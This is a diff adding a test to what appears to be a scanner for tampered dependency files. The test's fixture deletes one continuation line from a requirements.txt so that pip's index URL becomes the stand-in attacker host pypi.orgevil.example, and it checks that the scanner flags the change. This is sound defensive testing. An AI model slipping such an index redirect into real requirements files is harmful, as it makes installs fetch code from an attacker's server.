@@ -1427,6 +1427,23 @@ def test_a_file_renamed_into_a_line_checked_lockfile_name_is_checked_whole():
     assert out.exit_code == 1 and "lockfile-host" in gh.posted[0][2]
 
 
+def test_deleting_a_line_from_a_requirements_file_is_checked():
+    # The whole change is one deleted line, so there is no added line to
+    # check: with `/simple` gone, pip joins the continuation onto the package
+    # name below it and the index becomes https://pypi.orgevil.example. End
+    # to end because it needs core to fetch the BASE of a requirements file,
+    # not just its head.
+    gh = FakeGitHub(
+        diff=("diff --git a/requirements.txt b/requirements.txt\n"
+              "--- a/requirements.txt\n+++ b/requirements.txt\n"
+              "@@ -1,3 +1,2 @@\n --index-url https://pypi.org\\\n-/simple\n evil.example\n"),
+        files={"requirements.txt": b"--index-url https://pypi.org\\\nevil.example\n"},
+        base_files={"requirements.txt": b"--index-url https://pypi.org\\\n/simple\nevil.example\n"})
+    out, _ = run(gh)
+    assert out.exit_code == 1
+    assert "pypi.orgevil.example" in gh.posted[0][2]
+
+
 def test_a_lockfile_moved_to_another_directory_keeps_its_base():
     gh = FakeGitHub(diff=pure_rename("a/package-lock.json", "b/package-lock.json"),
                     files={"b/package-lock.json": EVIL_NPM},
